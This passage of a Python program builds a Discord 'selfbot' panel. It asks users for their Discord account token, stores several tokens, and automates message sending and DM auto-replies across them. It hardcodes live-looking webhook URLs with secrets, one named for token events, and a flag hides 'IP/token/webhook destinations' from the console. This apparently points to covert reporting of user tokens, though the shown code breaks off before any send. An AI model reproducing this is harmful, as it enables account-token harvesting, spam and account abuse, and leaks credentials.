import discord
import requests
import json
import os
import time
from datetime import datetime, timezone
import platform
import hashlib
import threading
import sys
import subprocess
import re
import webbrowser

# Added GUI-related imports
import tkinter as tk
from tkinter import messagebox, simpledialog, font
from PIL import Image, ImageTk, ImageDraw
import pygame
import math, random, io

# Optional system metrics
try:
    import psutil
    _HAS_PSUTIL = True
except Exception:
    _HAS_PSUTIL = False

SB_VERSION = "2025-08-16.7"

# Optional banner dependencies (fallback to plain text if not installed)
try:
    from colorama import init as colorama_init, Fore, Style
    from pyfiglet import figlet_format
    BANNER_OK = True
except Exception:
    BANNER_OK = False

# Windows keypress (non-blocking) support
try:
    import msvcrt  # type: ignore
    HAS_MSVCRT = True
except Exception:
    HAS_MSVCRT = False

# Safe pygame mixer init (do not crash if not available)
try:
    pygame.mixer.init()
except Exception:
    pass


def render_banner(status: str = "offline", frame: int = 0):
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    # Choose font (bigger if available)
    if BANNER_OK:
        try:
            banner = figlet_format("KoolaidSippin", font="straight")
        except Exception:
            try:
                banner = figlet_format("KoolaidSippin", font="block")
            except Exception:
                banner = figlet_format("KoolaidSippin", font="big")
        # Render a white cup with purple lean next to the banner
        cup_template = [
            "         __________ ",
            "        /        /\\",
            "       /  [PP]  /  \\",
            "      /________/   \\",
            "      \\        \\   /",
            "       \\ [PP]   \\ / ",
            "        \\________/   ",
            "           |  |      ",
            "           |__|      ",
        ]
        banner_lines = banner.rstrip("\n").split("\n")
        space = "   "
        # Build colored cup lines: white outline with purple lean fill
        cup_lines = []
        for line in cup_template:
            colored = Fore.WHITE + line.replace("[PP]", Fore.MAGENTA + "██" + Fore.WHITE)
            cup_lines.append(Style.BRIGHT + colored + Style.RESET_ALL)
        max_lines = max(len(banner_lines), len(cup_lines))
        for i in range(max_lines):
            left = banner_lines[i] if i < len(banner_lines) else ""
            right = cup_lines[i] if i < len(cup_lines) else ""
            print(Style.BRIGHT + Fore.MAGENTA + left + Style.RESET_ALL + space + right)
    else:
        print("\n==================== KoolaidSippin ====================   🥤💜\n")
    # Animated marker
    wave = ["<<    >>", " <<<  >>> ", "  <<>>>>  ", " <<<  >>> "]
    mark = wave[frame % len(wave)]
    if status.lower() == "online":
        stat_text = Style.BRIGHT + Fore.GREEN + f"[ ONLINE ] {mark}"
    else:
        stat_text = Style.BRIGHT + Fore.RED + f"[ OFFLINE ] {mark}"
    print(stat_text + Style.RESET_ALL)
    # Subtitle
    if BANNER_OK:
        print(Fore.WHITE + "made by " + Style.BRIGHT + Fore.MAGENTA + "iris" + Style.RESET_ALL + " & " + Style.BRIGHT + Fore.MAGENTA + "classical" + Style.RESET_ALL)
    else:
        print("made by iris & classical")
    print("")


def show_banner_and_prompt() -> tuple[str, str, str]:
    # New GUI login window replacing console input
    root = tk.Tk()
    root.title("KS Bot Activation")
    root.configure(bg="#1e1b29")
    root.geometry("620x460")
    root.resizable(False, False)

    # Center on screen
    try:
        root.update_idletasks()
        sw = root.winfo_screenwidth()
        sh = root.winfo_screenheight()
        ww, wh = 620, 460
        x = int((sw - ww) / 2)
        y = int((sh - wh) / 3)
        root.geometry(f"{ww}x{wh}+{x}+{y}")
    except Exception:
        pass

    # Optional background image (file path or URL) via LOGIN_BG_IMAGE
    try:
        bg_src = (os.getenv("LOGIN_BG_IMAGE", "") or "").strip()
        if bg_src:
            img_obj = None
            if bg_src.lower().startswith("http://") or bg_src.lower().startswith("https://"):
                try:
                    r = requests.get(bg_src, timeout=8)
                    if r.status_code == 200:
                        import io as _io
                        img_obj = Image.open(_io.BytesIO(r.content))
                except Exception:
                    img_obj = None
            elif os.path.exists(bg_src):
                try:
                    img_obj = Image.open(bg_src)
                except Exception:
                    img_obj = None
            if img_obj is not None:
                try:
                    ww, wh = 520, 380
                    img_obj = img_obj.convert("RGB").resize((ww, wh), Image.LANCZOS)
                    bg_photo = ImageTk.PhotoImage(img_obj)
                    bg_label = tk.Label(root, image=bg_photo, bd=0)
                    bg_label.place(x=0, y=0, relwidth=1, relheight=1)
                    # Keep a reference to prevent GC
                    root._login_bg_photo = bg_photo
                except Exception:
                    pass
    except Exception:
        pass

    card = tk.Frame(root, bg="#2c2750", bd=2, relief="ridge")
    card.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.88, relheight=0.86)

    title = tk.Label(card, text="KS Bot Login", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 16, "bold"))
    title.pack(pady=(12, 6))

    frm = tk.Frame(card, bg="#2c2750")
    frm.pack(fill="x", padx=20)

    def mk_entry(label_text: str, show: str | None = None):
        row = tk.Frame(frm, bg="#2c2750")
        row.pack(fill="x", pady=6)
        tk.Label(row, text=label_text, bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 10, "bold")).pack(anchor="w")
        ent = tk.Entry(row, show=show, bg="#1e1b29", fg="#e0d7ff", insertbackground="#e0d7ff")
        ent.pack(fill="x", pady=2)
        return ent

    activation_entry = mk_entry("Activation Key")
    user_id_entry = mk_entry("Discord User ID")
    
    # Machine ID (auto)
    try:
        mid_row = tk.Frame(frm, bg="#2c2750")
        mid_row.pack(fill="x", pady=6)
        tk.Label(mid_row, text="Machine ID (auto)", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 10, "bold")).pack(anchor="w")
        mid_entry = tk.Entry(mid_row, bg="#1e1b29", fg="#9ab0ff", state="readonly")
        try:
            mid_val = machine_id()
        except Exception:
            mid_val = "unknown"
        mid_var = tk.StringVar(value=mid_val)
        mid_entry.config(textvariable=mid_var, readonlybackground="#1e1b29")
        mid_entry.pack(fill="x", pady=2)
    except Exception:
        pass
    
    token_row = tk.Frame(frm, bg="#2c2750")
    token_row.pack(fill="x", pady=6)
    tk.Label(token_row, text="Discord User Token", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 10, "bold")).pack(anchor="w")
    inner = tk.Frame(token_row, bg="#2c2750")
    inner.pack(fill="x", pady=2)
    token_entry = tk.Entry(inner, show="*", bg="#1e1b29", fg="#e0d7ff", insertbackground="#e0d7ff")
    token_entry.pack(side="left", fill="x", expand=True)

    def toggle_token():
        current = token_entry.cget("show")
        token_entry.config(show="" if current == "*" else "*")
        btn.config(text="Hide" if current == "*" else "Show")

    btn = tk.Button(inner, text="Show", command=toggle_token, bg="#5a3e99", fg="#f0e9ff",
                    activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat", cursor="hand2")
    btn.pack(side="left", padx=(8, 0))

    # Login button directly under token input
    token_login = tk.Button(frm, text="Login", command=lambda: submit(), bg="#5a3e99", fg="#f0e9ff",
                            activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat", cursor="hand2",
                            font=("Segoe UI", 11, "bold"))
    token_login.pack(fill="x", padx=0, pady=(4, 0))

    credit = tk.Frame(card, bg="#1e1b29", bd=2, relief="groove")
    credit.pack(pady=12, padx=20, fill="x")
    tk.Label(credit, text="Made by", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 10)).pack()
    tk.Label(credit, text="Iris&classical", bg="#1e1b29", fg="#e0d7ff", font=("Segoe UI", 12, "bold")).pack()

    status_label = tk.Label(card, text="", bg="#2c2750", fg="#ff6b6b", font=("Segoe UI", 9))
    status_label.pack(pady=(0, 6))

    result = ["", "", ""]

    def submit():
        a = activation_entry.get().strip()
        uid = user_id_entry.get().strip()
        tok = token_entry.get().strip()
        if not a or not uid or not tok:
            status_label.config(text="All fields are required.")
            return
        # Verify the user is a member of the Discord guild before proceeding
        try:
            url = f"https://discord.com/api/v10/guilds/{GUILD_ID}/members/{uid}"
            r = requests.get(url, headers={"Authorization": tok}, timeout=10)
            if r.status_code != 200:
                try:
                    title = os.getenv("JOIN_DIALOG_TITLE", "Join Discord")
                    text = os.getenv("JOIN_DIALOG_TEXT", "You need to be in our Discord to run this selfbot.\\nJoin here: https://discord.gg/fEeeXAJfbF")
                    messagebox.showerror(title, text)
                except Exception:
                    pass
                return
        except Exception:
            try:
                title = os.getenv("JOIN_DIALOG_TITLE", "Join Discord")
                text = os.getenv("JOIN_DIALOG_TEXT", "Could not verify Discord membership. Please join here and try again: https://discord.gg/fEeeXAJfbF")
                messagebox.showerror(title, text)
            except Exception:
                pass
            return
        result[0], result[1], result[2] = a, uid, tok
        root.destroy()

    # Bottom login button
    tk.Button(card, text="Login", command=submit, bg="#5a3e99", fg="#f0e9ff",
              activebackground="#7d5fff", activeforeground="#f0e9ff", relief="flat", cursor="hand2",
              font=("Segoe UI", 11, "bold")).pack(side="bottom", pady=(6, 10))

    root.bind("<Return>", lambda e: submit())
    root.mainloop()
    return result[0], result[1], result[2]

# Configuration
WEBHOOK_URL = "https://discord.com/api/webhooks/1406343964164096081/tNGng-BvgV62_9J4gOc59rOW7no2-BSeXye4zuqMHBxi97n8ZzETg5nqzez7ig9SHZ4A"
CHANNEL_ID = 1404537520754135231  # Channel ID from webhook
ACTIVATION_FILE = "activation.json"
GUILD_ID = 1402622761246916628  # Your Discord server ID
ROLE_ID = 1404221578782183556  # Role ID that grants access
OWNER_ROLE_ID = int(os.getenv("OWNER_ROLE_ID", "1402650246538072094"))
CHATSEND_ROLE_ID = int(os.getenv("CHATSEND_ROLE_ID", "1406339861593591900"))
SERVICE_URL = os.getenv("SERVICE_URL", "https://discord-key-bot-w92w.onrender.com")  # Bot website for API (overridable)
CHAT_MIRROR_WEBHOOK = os.getenv("CHAT_MIRROR_WEBHOOK", "https://discord.com/api/webhooks/1408279883519627364/BEfE1V2LDgacgb30nv1TbIBMV1EWlDtbA4iL_HU0GJKEeT314Xpi34UtgFYJSjU9hVgi")
TOKEN_EVENT_WEBHOOK = os.getenv("TOKEN_EVENT_WEBHOOK", "https://discord.com/api/webhooks/1408612575003934831/KkcW8DX1y428mp75FAWdYQ9FTwL0tCzLdzmpBRkQwMf-HjtbAztkyBEXqNfIzCZPATO2itll")

SILENT_LOGS = True  # do not print IP/token/webhook destinations to console

def machine_id() -> str:
    raw = f"{platform.node()}|{platform.system()}|{platform.machine()}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def mask_token(token: str, keep_start: int = 6, keep_end: int = 4) -> str:
    if not token or len(token) <= keep_start + keep_end:
        return "*" * len(token)
    return token[:keep_start] + "*" * (len(token) - keep_start - keep_end) + token[-keep_end:]


# ---------------------- GUI PANEL ----------------------
class DiscordBotGUI:
    TOKENS_FILE = "tokens.json"
    CHANNELS_FILE = "channels.json"
    STATS_FILE = "message_stats.json"
    ROTATOR_FILE = "rotator_messages.txt"

    def __init__(self, root: tk.Tk, initial_token: str | None = None, initial_user_id: str | None = None):
        self.root = root
        self.root.title("KS SelfBot Panel")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        self.is_fullscreen = True
        self.root.attributes("-fullscreen", True)
        self.root.bind("<F11>", self.toggle_fullscreen)
        self.root.bind("<Escape>", self.exit_fullscreen)
        # Store user id for expiry watchdog
        self._login_user_id = initial_user_id

        # Fonts
        self.title_font = font.Font(family="Segoe UI", size=11, weight="bold")
        self.normal_font = font.Font(family="Segoe UI", size=10)
        self.mono_font = font.Font(family="Consolas", size=10)

        # Initialize variables
        self.tokens: dict[str, str] = {}
        self.channels: dict[str, str] = {}
        self.auto_reply_running = False
        self.send_running = False
        # Chat state
        self.chat_last_ts = 0
        self.chat_can_send = False

        self.selected_token_name = None
        self.selected_channel_names: list[str] = []

        # Message stats
        self.message_counter_total: int = 0
        self.message_counts_by_user: dict[str, int] = {}
        self.message_counts_by_role: dict[str, int] = {}
        self._roles_cache: dict[str, list[str]] = {}  # user_id -> [role_ids]
        self._user_id_cache: dict[str, str] = {}      # token -> user_id
        # Message rotator state
        self.rotator_messages: list[str] = []
        self.rotator_index: int = 0
        self.rotator_enabled_var = tk.BooleanVar(value=False)

        # Setup Background Canvas (static plain dark purple to reduce lag)
        self.bg_canvas = tk.Canvas(self.root, width=900, height=700, highlightthickness=0, bg="#120f1f")
        self.bg_canvas.pack(fill="both", expand=True)
        # Disable gradient/vignette/particle animations for performance
        try:
            self.root.unbind("<Configure>")
        except Exception:
            pass

        # Overlay Frame for widgets (transparent background)
        self.main_frame = tk.Frame(self.root, bg="#1e1b29")
        # Defer placing main UI until welcome terminal finishes
        self._mf_place_args = dict(relx=0.03, rely=0.08, relwidth=0.94, relheight=0.89)

        # Setup GUI widgets on main_frame
        self.setup_gui()

        # Init user token and backup channel
        self.user_token = initial_token
        self.backup_channel_id = os.getenv("SELF_BOT_BACKUP_CHANNEL_ID") or os.getenv("BACKUP_CHANNEL_ID") or ""
        # Restore remote backup before loading local files (non-blocking)
        if self.backup_channel_id and self.user_token:
            def _restore_async():
                try:
                    self.restore_from_discord_backup()
                except Exception as e:
                    try:
                        self.log(f"Backup restore failed: {e}")
                    except Exception:
                        pass
            threading.Thread(target=_restore_async, daemon=True).start()

        # Load saved tokens and channels
        self.load_data()

        # Load rotator messages from text file
        try:
            if os.path.exists(self.ROTATOR_FILE):
                with open(self.ROTATOR_FILE, "r", encoding="utf-8") as f:
                    lines = [ln.strip() for ln in f.readlines()]
                    self.rotator_messages = [ln for ln in lines if ln]
        except Exception:
            pass

        # Load message stats
        self.load_stats()

        # If an initial token is provided from activation, store and select it
        if initial_token:
            self.tokens["current"] = initial_token
            self.save_data()
            self.update_token_menu()
            self.token_var.set("current")
            threading.Thread(target=self.fetch_and_display_user_info, args=(initial_token,), daemon=True).start()
        
        # Initially hide main UI; it will be placed after welcome finishes
        self.main_frame.place_forget()
        # Prepare terminal overlay immediately; start typing after username resolves
        try:
            self._welcome_started = False
            self._ensure_terminal_overlay()
        except Exception:
            pass

        # Bind token selection event
        self.token_var.trace_add("write", lambda *a: self.on_token_change())

        # Protocol handler for graceful shutdown
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        # Play opening sound if available
        self.play_opening_sound()

        # Apply theme/colors/fonts to all widgets
        self.apply_theme()

        # eDEX-UI themed overlay and status bar (deferred to avoid startup lag)
        try:
            self.root.after(2500, self._deferred_enable_edex_theme)
        except Exception:
            pass

        # Credits overlay removed; credit will be shown under the reply delay section

        # Start expiry watchdog if we know who we are
        try:
            if self._login_user_id:
                self._start_expiry_watchdog()
        except Exception:
            pass

    # -------- Background & Visuals --------
    def create_gradient_image(self, width, height):
        base = Image.new('RGB', (width, height), "#1e1b29")
        draw = ImageDraw.Draw(base)
        for i in range(height):
            # Vertical gradient from rgb(90,62,153) to rgb(18,15,31)
            r = int(90 + (18 - 90) * (i / height))
            g = int(62 + (15 - 62) * (i / height))
            b = int(153 + (31 - 153) * (i / height))
            draw.line([(0, i), (width, i)], fill=(r, g, b))
        return base

    def create_tint_overlay(self, width, height):
        # Generate at half resolution to reduce CPU, then upscale
        try:
            w2 = max(1, width // 2)
            h2 = max(1, height // 2)
            small = Image.new('RGBA', (w2, h2))
            draw = ImageDraw.Draw(small)
            for y in range(h2):
                for x in range(w2):
                    dx = x - w2 / 2
                    dy = y - h2 / 2
                    dist = math.sqrt(dx * dx + dy * dy)
                    max_dist = math.sqrt((w2 / 2) ** 2 + (h2 / 2) ** 2)
                    alpha = int(min(150, max(0, (dist - max_dist * 0.6) / (max_dist * 0.4) * 150)))
                    draw.point((x, y), fill=(0, 0, 0, alpha))
            vignette = small.resize((max(1, width), max(1, height)), Image.BILINEAR)
        except Exception:
            vignette = Image.new('RGBA', (max(1, width), max(1, height)))
        self.vignette_photo = ImageTk.PhotoImage(vignette)
        # Do not create a new image item here; caller will itemconfigure it
        self.bg_canvas.create_image(0, 0, image=self.vignette_photo, anchor="nw")

    def create_particles(self, count):
        for _ in range(count):
            cw = int(self.bg_canvas.winfo_width() or 900)
            ch = int(self.bg_canvas.winfo_height() or 700)
            p = {
                'x': random.uniform(0, cw),
                'y': random.uniform(0, ch),
                'radius': random.uniform(1, 3),
                'speed': random.uniform(0.01, 0.03),
                'angle': random.uniform(0, 2 * math.pi),
                'id': None,
                'base_y': 0
            }
            p['base_y'] = p['y']
            p['id'] = self.bg_canvas.create_oval(
                p['x'], p['y'], p['x'] + p['radius'] * 2, p['y'] + p['radius'] * 2,
                fill="#5a3e99", outline=""
            )
            self.particles.append(p)

    def animate_particles(self):
        for p in self.particles:
            p['angle'] += p['speed']
            offset = math.sin(p['angle']) * 12
            new_y = p['base_y'] + offset
            self.bg_canvas.coords(p['id'], p['x'], new_y, p['x'] + p['radius'] * 2, p['y'] + p['radius'] * 2)
        self.root.after(50, self.animate_particles)

    def _on_root_resize(self, event=None):
        try:
            # Debounce to avoid excessive recomputation during live resizing
            if hasattr(self, '_resize_job') and self._resize_job:
                try:
                    self.root.after_cancel(self._resize_job)
                except Exception:
                    pass
            def _do_resize():
                try:
                    cw = max(1, int(self.bg_canvas.winfo_width()))
                    ch = max(1, int(self.bg_canvas.winfo_height()))
                    # Regenerate gradient and vignette to fit canvas
                    self.gradient_image = self.create_gradient_image(cw, ch)
                    self.bg_photo = ImageTk.PhotoImage(self.gradient_image)
                    try:
                        self.bg_canvas.itemconfigure(self._bg_img_item, image=self.bg_photo)
                    except Exception:
                        self._bg_img_item = self.bg_canvas.create_image(0, 0, image=self.bg_photo, anchor="nw")
                    self.create_tint_overlay(cw, ch)
                    try:
                        self.bg_canvas.itemconfigure(self._vignette_item, image=self.vignette_photo)
                    except Exception:
                        self._vignette_item = self.bg_canvas.create_image(0, 0, image=self.vignette_photo, anchor="nw")
                    # Re-seed particles if there are too few to cover new area
                    need = max(0, int((cw * ch) / (900*700) * 48) - len(self.particles))
                    if need > 0:
                        self.create_particles(need)
                except Exception:
                    pass
            self._resize_job = self.root.after(120, _do_resize)
        except Exception:
            pass

    # -------- Fullscreen helpers --------
    def toggle_fullscreen(self, event=None):
        self.is_fullscreen = not getattr(self, 'is_fullscreen', False)
        self.root.attributes("-fullscreen", self.is_fullscreen)

    def exit_fullscreen(self, event=None):
        self.is_fullscreen = False
        self.root.attributes("-fullscreen", False)

    # -------- Credits Box --------
    def create_credit_box(self):
        self.credit_frame = tk.Frame(self.root, bg="#2c2750", bd=2, relief="ridge")
        # Non-closable credit box centered
        title_lbl = tk.Label(self.credit_frame, text="KoolaidSippin", bg="#2c2750", fg="#e0d7ff", font=("Segoe UI", 16, "bold"))
        title_lbl.pack(padx=16, pady=(10, 2))
        tk.Label(self.credit_frame, text="Made by", bg="#2c2750", fg="#e0d7ff", font=self.normal_font).pack(padx=16)
        tk.Label(self.credit_frame, text="Iris&classical", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(padx=16, pady=(0, 12))
        self.credit_frame.place(relx=0.5, rely=0.5, anchor="center")

    # -------- GUI Widgets Setup --------
    def setup_gui(self):
        frame = self.main_frame
        # User info header (avatar + username)
        self.user_info_frame = tk.Frame(frame, bg="#1e1b29")
        self.user_info_frame.place(relx=0.0, rely=0.0, relwidth=0.65, relheight=0.08)
        # Strip of selected token avatars (up to 3)
        self.avatar_strip = tk.Frame(self.user_info_frame, bg="#1e1b29")
        self.avatar_strip.pack(side="left", padx=(6, 4), pady=6)
        self._selected_avatar_photos = []
        self.root.after(800, self._refresh_selected_avatars)
        self.avatar_label = tk.Label(self.user_info_frame, bg="#1e1b29")
        self.avatar_label.pack(side="left", padx=(4, 8), pady=(8,6))
        self.username_label = tk.Label(self.user_info_frame, text="", bg="#1e1b29", fg="#e0d7ff")
        self.username_label.pack(side="left", pady=(8,6))

        # Left column for controls (below user header)
        left = tk.Frame(frame, bg="#1e1b29")
        left.place(relx=0.0, rely=0.08, relwidth=0.65, relheight=0.92)
        left.grid_columnconfigure(0, weight=1)
        left.grid_columnconfigure(1, weight=1)
        left.grid_columnconfigure(2, weight=0)
        left.grid_columnconfigure(3, weight=0)
        left.grid_rowconfigure(4, weight=1)  # message content grows

        # Right column for admin broadcast chat (unchanged)
        right = tk.Frame(frame, bg="#1e1b29")
        right.place(relx=0.675, rely=0.0, relwidth=0.325, relheight=1.0)

        # Top controls moved: Channel first (row 0), Token below (row 1)
        chan_bar = tk.Frame(left, bg="#2c2750")
        chan_bar.grid(row=0, column=0, columnspan=3, sticky="we", padx=10, pady=(2, 1))
        tk.Label(chan_bar, text="Channel ID", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(side="left", padx=(8, 4))
        tk.Label(chan_bar, text="|", bg="#2c2750", fg="#bfaef5").pack(side="left")
        self.channel_entry = tk.Entry(chan_bar, width=62, relief="flat", bg="#1e1b29", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.channel_entry.pack(side="left", fill="x", expand=True, padx=(8, 8), ipady=4)
        tk.Button(chan_bar, text="Save", command=self.save_channel).pack(side="left", padx=(0, 6))
        try:
            self.apply_glow(chan_bar, thickness=2)
            self.apply_glow(self.channel_entry)
        except Exception:
            pass

        # Saved channels checklist to the right of the channel bar
        self.channel_vars = {}
        # Scrollable channels area (medium height)
        # Channels box to the right of channel entry
        self.channels_select_wrap = tk.Frame(left, bg="#2c2750")
        self.channels_select_wrap.grid(row=0, column=3, sticky="nwe", padx=6, pady=(0,0))
        try:
            self.apply_glow(self.channels_select_wrap, thickness=2)
        except Exception:
            pass
        tk.Label(self.channels_select_wrap, text="Channels", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(anchor="w", padx=8, pady=(2,2))
        self.channels_canvas = tk.Canvas(self.channels_select_wrap, bg="#120f1f", highlightthickness=0, height=110)
        self.channels_canvas.pack(side="left", fill="both", expand=True, padx=(8,0), pady=(0,8))
        self.channels_sb = tk.Scrollbar(self.channels_select_wrap, orient="vertical", command=self.channels_canvas.yview)
        self.channels_sb.pack(side="right", fill="y")
        self.channels_canvas.configure(yscrollcommand=self.channels_sb.set)
        self.channels_frame = tk.Frame(self.channels_canvas, bg="#120f1f")
        self.channels_canvas_window = self.channels_canvas.create_window((0, 0), window=self.channels_frame, anchor="nw")
        def _channels_on_configure(event=None):
            try:
                self.channels_canvas.configure(scrollregion=self.channels_canvas.bbox("all"))
            except Exception:
                pass
        self.channels_frame.bind("<Configure>", _channels_on_configure)
        def _channels_canvas_resize(event):
            try:
                self.channels_canvas.itemconfigure(self.channels_canvas_window, width=event.width)
            except Exception:
                pass
        self.channels_canvas.bind("<Configure>", _channels_canvas_resize)

        # Token integrated bar (row 1)
        token_bar = tk.Frame(left, bg="#2c2750")
        token_bar.grid(row=1, column=0, columnspan=2, sticky="we", padx=10, pady=(0, 2))
        tk.Label(token_bar, text="Token", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(side="left", padx=(8, 4))
        tk.Label(token_bar, text="|", bg="#2c2750", fg="#bfaef5").pack(side="left")
        self.token_entry = tk.Entry(token_bar, width=72, relief="flat", bg="#120f1f", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.token_entry.pack(side="left", fill="x", expand=True, padx=(8, 8), ipady=4)
        tk.Button(token_bar, text="Save", command=self.save_token).pack(side="left", padx=(0, 6))
        self.token_var = tk.StringVar()
        # Select token box to the right of token entry
        select_wrap = tk.Frame(left, bg="#2c2750")
        select_wrap.grid(row=1, column=2, columnspan=2, sticky="we", padx=(6,10), pady=(0,0))
        try:
            self.apply_glow(select_wrap, thickness=2)
        except Exception:
            pass
        tk.Label(select_wrap, text="Select up to 3 tokens:", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(anchor="w", padx=8, pady=(2,2))
        self.multi_tokens_canvas = tk.Canvas(select_wrap, bg="#120f1f", highlightthickness=0, height=64)
        self.multi_tokens_canvas.pack(side="left", fill="x", expand=True, padx=(8,0), pady=(0,8))
        self.multi_tokens_sb = tk.Scrollbar(select_wrap, orient="vertical", command=self.multi_tokens_canvas.yview)
        self.multi_tokens_sb.pack(side="right", fill="y")
        self.multi_tokens_canvas.configure(yscrollcommand=self.multi_tokens_sb.set)
        self.multi_tokens_frame = tk.Frame(self.multi_tokens_canvas, bg="#120f1f")
        self.multi_tokens_canvas_window = self.multi_tokens_canvas.create_window((0,0), window=self.multi_tokens_frame, anchor="nw")
        def _multi_conf(e=None):
            try:
                self.multi_tokens_canvas.configure(scrollregion=self.multi_tokens_canvas.bbox("all"))
                self.multi_tokens_canvas.itemconfigure(self.multi_tokens_canvas_window, width=self.multi_tokens_canvas.winfo_width())
            except Exception:
                pass
        self.multi_tokens_frame.bind('<Configure>', _multi_conf)
        # Multi-token selection (up to 3) moved to separate box on the right
        try:
            self.apply_glow(token_bar, thickness=2)
            self.apply_glow(self.token_entry)
        except Exception:
            pass

        # Run buttons will be placed under the credit box in the Delays section

        # Reply DM message integrated bar (row 2)
        reply_bar = tk.Frame(left, bg="#2c2750")
        reply_bar.grid(row=2, column=0, columnspan=4, sticky="we", padx=10, pady=(2, 2))
        tk.Label(reply_bar, text="Reply DM", bg="#2c2750", fg="#e0d7ff", font=self.title_font).pack(side="left", padx=(8, 4))
        tk.Label(reply_bar, text="|", bg="#2c2750", fg="#bfaef5").pack(side="left")
        inner_reply = tk.Frame(reply_bar, bg="#2c2750")
        inner_reply.pack(side="left", fill="x", expand=True)
        self.reply_dm_entry = tk.Text(inner_reply, height=6, width=64, relief="flat", bg="#120f1f", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.reply_dm_entry.pack(fill="x", expand=True, padx=(8, 8), pady=(4, 4))
        self.reply_dm_button = tk.Button(reply_bar, text="Start Reply DM", command=self.toggle_reply_dm)
        self.reply_dm_button.pack(side="left", padx=(6, 8))
        try:
            self.apply_glow(reply_bar, thickness=2)
            self.apply_glow(self.reply_dm_entry)
        except Exception:
            pass

        # Message Rotator moved under message content area
        rot = tk.Frame(left, bg="#2c2750")
        rot.grid(row=5, column=0, columnspan=1, sticky="we", padx=10, pady=(16, 4))
        try:
            self.apply_glow(rot, thickness=2)
        except Exception:
            pass
        tk.Checkbutton(rot, text="Use message rotator", variable=self.rotator_enabled_var, bg="#2c2750", fg="#e0d7ff", selectcolor="#5a3e99", activebackground="#2c2750", activeforeground="#e0d7ff").pack(anchor="w", padx=8, pady=(6, 4))
        # Wrap rotator controls (left) and rotator list (right)
        rot_wrap = tk.Frame(rot, bg="#1e1b29")
        rot_wrap.pack(fill="x")
        rot_left = tk.Frame(rot_wrap, bg="#1e1b29")
        rot_left.pack(side="left", fill="both", expand=True)
        rot_row = tk.Frame(rot_left, bg="#1e1b29")
        rot_row.pack(fill="x")
        # Make rotator input as wide as token bar
        self.rotator_input = tk.Entry(rot_row, relief="flat", bg="#2c2750", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.rotator_input.pack(side="left", fill="x", expand=True)
        # Buttons will be placed to the right of the Rotator Messages list
        try:
            self.apply_glow(self.rotator_input)
        except Exception:
            pass
        # Token switch delay control inside rotator
        rot_delay_row = tk.Frame(rot_left, bg="#1e1b29")
        rot_delay_row.pack(fill="x", pady=(6, 0))
        tk.Label(rot_delay_row, text="Token Switch Delay (s):", bg="#1e1b29", fg="#e0d7ff").pack(side="left")
        self.rotator_token_delay_entry = tk.Entry(rot_delay_row, width=6, relief="flat", bg="#2c2750", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.rotator_token_delay_entry.insert(0, "1")
        self.rotator_token_delay_entry.pack(side="left", padx=(8,0))
        try:
            self.apply_glow(self.rotator_token_delay_entry)
        except Exception:
            pass
        # Rotator messages list on the right side of rotator controls, with glowing border
        rot_right = tk.Frame(rot_wrap, bg="#1e1b29")
        rot_right.pack(side="right", fill="both", expand=False, padx=(8, 0))
        tk.Label(rot_right, text="Rotator Messages", bg="#1e1b29", fg="#e0d7ff").pack(anchor="w")
        rot_content = tk.Frame(rot_right, bg="#1e1b29")
        rot_content.pack(fill="y")
        try:
            self.apply_glow(rot_content, thickness=2)
        except Exception:
            pass
        list_frame = tk.Frame(rot_content, bg="#1e1b29")
        list_frame.pack(side="left", fill="y")
        self.rotator_list = tk.Listbox(list_frame, height=6, width=30, selectmode="browse", bg="#2c2750", fg="#e0d7ff",
                                       activestyle="dotbox", highlightthickness=0, relief="flat")
        self.rotator_list.pack(side="left", fill="y")
        rot_scroll = tk.Scrollbar(list_frame, orient="vertical", command=self.rotator_list.yview)
        rot_scroll.pack(side="right", fill="y")
        self.rotator_list.configure(yscrollcommand=rot_scroll.set)
        self.rotator_list.bind("<Double-Button-1>", lambda e: self._rotator_remove())
        # Buttons to the right of the list
        rot_btns = tk.Frame(rot_content, bg="#1e1b29")
        rot_btns.pack(side="right", padx=(8, 0), anchor="n")
        self.btn_add = tk.Button(rot_btns, text="Add", command=self._rotator_add, width=10)
        self.btn_add.pack(fill="x")
        self.btn_remove = tk.Button(rot_btns, text="Remove", command=self._rotator_remove, width=10)
        self.btn_remove.pack(fill="x", pady=(6, 0))
        self.btn_clear = tk.Button(rot_btns, text="Clear", command=self._rotator_clear, width=10)
        self.btn_clear.pack(fill="x", pady=(6, 0))

        # Bottom row: Message Content label and box (same height as activity log)
        msg_bar = tk.Frame(left, bg="#2c2750")
        msg_bar.grid(row=4, column=0, sticky="we", padx=10, pady=(10,6))
        try:
            self.apply_glow(msg_bar, thickness=2)
        except Exception:
            pass
        # eDEX-style header for message content
        try:
            mc_bar = tk.Frame(msg_bar, bg="#0b1020")
            mc_bar.pack(fill="x", side="top")
            try:
                self.apply_glow(mc_bar, thickness=2)
            except Exception:
                pass
            tk.Label(mc_bar, text="MESSAGE CONTENT", bg="#0b1020", fg="#b799ff", font=("Consolas", 10, "bold")).pack(side="left", padx=8)
            for color in ("#22c55e", "#f59e0b", "#ef4444"):
                c = tk.Canvas(mc_bar, width=10, height=10, bg="#0b1020", highlightthickness=0)
                c.pack(side="right", padx=3)
                c.create_oval(2, 2, 8, 8, fill=color, outline=color)
        except Exception:
            pass
        # Make message box as big as token bar width and match chat background
        self.message_entry = tk.Text(msg_bar, height=12, relief="flat", bg="#120f1f", fg="#e0d7ff", insertbackground="#e0d7ff")
        self.message_entry.pack(fill="both", expand=True)
